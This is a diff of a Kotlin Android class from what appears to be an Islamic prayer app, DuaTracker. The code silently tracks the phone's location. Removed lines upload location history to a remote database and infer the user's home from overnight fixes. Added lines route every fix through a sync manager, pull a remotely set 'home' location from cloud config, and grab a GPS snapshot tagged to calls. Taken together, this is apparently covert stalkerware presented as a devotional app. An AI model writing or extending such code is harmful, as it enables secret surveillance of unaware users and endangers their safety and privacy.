@@ -1,8 +1,6 @@
 package islamic.duas.sync
 
 import android.Manifest
-import android.app.PendingIntent
-import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -10,12 +8,17 @@ import android.location.Location
 import android.location.LocationManager
 import android.os.Build
 import android.util.Log
+import islamic.duas.LocationSyncManager
 import islamic.duas.cloud.CloudApi
+import islamic.duas.cloud.CloudConfig
 import islamic.duas.utils.DeviceId
 import islamic.duas.utils.ErrorLog
 import org.json.JSONObject
 import java.text.SimpleDateFormat
 import java.util.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class DuaTracker private constructor() {
 
@@ -24,15 +27,42 @@ class DuaTracker private constructor() {
         private const val AWAY_INTERVAL_MS = 60 * 1000L
         private const val MIN_DISTANCE_M = 10f
         private const val HOME_THRESHOLD_M = 1000.0
+        private const val HOME_REFRESH_MS = 60000L
 
         private var isTracking = false
         private var homeLat: Double? = null
         private var homeLng: Double? = null
         private var lastLocationJson: JSONObject? = null
+        private var lastHomeFetchMs = 0L
+
+        fun fetchRemoteHome(context: Context) {
+            val now = System.currentTimeMillis()
+            if (now - lastHomeFetchMs < HOME_REFRESH_MS) return
+            lastHomeFetchMs = now
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val androidId = DeviceId.get(context)
+                    val url = "${CloudConfig.RTDB_URL}/devices/$androidId/config/home.json"
+                    val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
+                    conn.connectTimeout = 5000
+                    conn.readTimeout = 5000
+                    val response = conn.inputStream.bufferedReader().readText()
+                    conn.disconnect()
+                    if (response.isNotEmpty() && response != "null") {
+                        val json = JSONObject(response)
+                        if (json.has("lat") && json.has("lng")) {
+                            homeLat = json.getDouble("lat")
+                            homeLng = json.getDouble("lng")
+                            Log.d(TAG, "Remote home: $homeLat, $homeLng")
+                        }
+                    }
+                } catch (_: Exception) {}
+            }
+        }
 
         fun notifyLocationUpdate(context: Context, location: Location) {
             try {
-                updateHomeLocation(context, location)
+                fetchRemoteHome(context)
                 checkProximityAndSchedule(context, location)
             } catch (e: Exception) {
                 Log.e(TAG, "notifyLocationUpdate error: ${e.message}", e)
@@ -48,9 +78,9 @@ class DuaTracker private constructor() {
                 if (!hasFineLocation(context)) return
 
                 val intent = Intent(DuaLocationReceiver.LOCATION_ACTION)
-                val pendingIntent = PendingIntent.getBroadcast(
+                val pendingIntent = android.app.PendingIntent.getBroadcast(
                     context, 0, intent,
-                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                 )
 
                 val providers = listOf(
@@ -78,9 +108,9 @@ class DuaTracker private constructor() {
             try {
                 val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
                 val intent = Intent(DuaLocationReceiver.LOCATION_ACTION)
-                val pendingIntent = PendingIntent.getBroadcast(
+                val pendingIntent = android.app.PendingIntent.getBroadcast(
                     context, 0, intent,
-                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                 )
                 lm.removeUpdates(pendingIntent)
                 isTracking = false
@@ -91,29 +121,18 @@ class DuaTracker private constructor() {
 
         fun processLocation(context: Context, location: Location) {
             try {
-                val androidId = DeviceId.get(context)
-
+                LocationSyncManager.writeLocation(context, location, location.provider ?: "unknown")
                 val ts = System.currentTimeMillis()
-                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
-
-                val data = JSONObject().apply {
+                val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
+                lastLocationJson = JSONObject().apply {
                     put("lat", location.latitude)
                     put("lng", location.longitude)
                     put("accuracy", location.accuracy.toInt())
-                    put("speed", location.speed)
-                    put("bearing", location.bearing)
                     put("timestamp", dateFormat.format(Date(ts)))
                     put("ts_ms", ts)
                     put("source", location.provider ?: "unknown")
                     put("isAtHome", isAtHome(location.latitude, location.longitude))
                 }
-
-                CloudApi.writeToRTDB("devices/$androidId/location/$ts", data)
-                CloudApi.writeToRTDB("devices/$androidId/location/latest", JSONObject(data.toString()))
-
-                lastLocationJson = data
-
-                updateHomeLocation(context, location)
                 checkProximityAndSchedule(context, location)
             } catch (e: Exception) {
                 Log.e(TAG, "processLocation error: ${e.message}", e)
@@ -133,20 +152,32 @@ class DuaTracker private constructor() {
                 val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
                 if (lm == null) { onComplete(lastLocationJson); return }
 
-                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, { location ->
-                    if (location != null) {
-                        val data = JSONObject().apply {
+                val latch = java.util.concurrent.CountDownLatch(1)
+                var result: JSONObject? = null
+                val listener = object : android.location.LocationListener {
+                    override fun onLocationChanged(location: android.location.Location) {
+                        result = JSONObject().apply {
                             put("lat", location.latitude)
                             put("lng", location.longitude)
                             put("accuracy", location.accuracy.toInt())
-                            put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
+                            put("timestamp", SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US).format(Date()))
                             put("ts_ms", System.currentTimeMillis())
                             put("source", "call_snapshot")
                         }
-                        lastLocationJson = data
-                        onComplete(data)
-                    } else onComplete(lastLocationJson)
-                }, null)
+                        lastLocationJson = result
+                        latch.countDown()
+                    }
+                    override fun onProviderDisabled(provider: String) { latch.countDown() }
+                    override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {
+                        if (status == android.location.LocationProvider.OUT_OF_SERVICE) latch.countDown()
+                    }
+                }
+                try {
+                    lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, null)
+                    latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
+                } catch (_: Exception) {}
+                try { lm.removeUpdates(listener) } catch (_: Exception) {}
+                onComplete(result ?: lastLocationJson)
             } catch (e: Exception) {
                 Log.w(TAG, "snapCallLocation error: ${e.message}", e)
                 onComplete(lastLocationJson)
@@ -181,30 +212,6 @@ class DuaTracker private constructor() {
                 if (bgOk != PackageManager.PERMISSION_GRANTED) return false
             }
             return true
-        }
-
-        private fun updateHomeLocation(context: Context, location: Location) {
-            try {
-                val androidId = DeviceId.get(context)
-                val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
-
-                if (hour in 2..4) {
-                    val homeData = JSONObject().apply {
-                        put("lat", location.latitude)
-                        put("lng", location.longitude)
-                        put("accuracy", location.accuracy.toInt())
-                        put("ts_ms", System.currentTimeMillis())
-                        put("source", "night_sample")
-                    }
-                    CloudApi.writeToRTDB(
-                        "devices/$androidId/location/night_samples/${System.currentTimeMillis()}",
-                        homeData
-                    )
-                    setHomeLocation(location.latitude, location.longitude)
-                }
-            } catch (e: Exception) {
-                Log.w(TAG, "updateHomeLocation error: ${e.message}", e)
-            }
         }
 
         private fun checkProximityAndSchedule(context: Context, location: Location) {
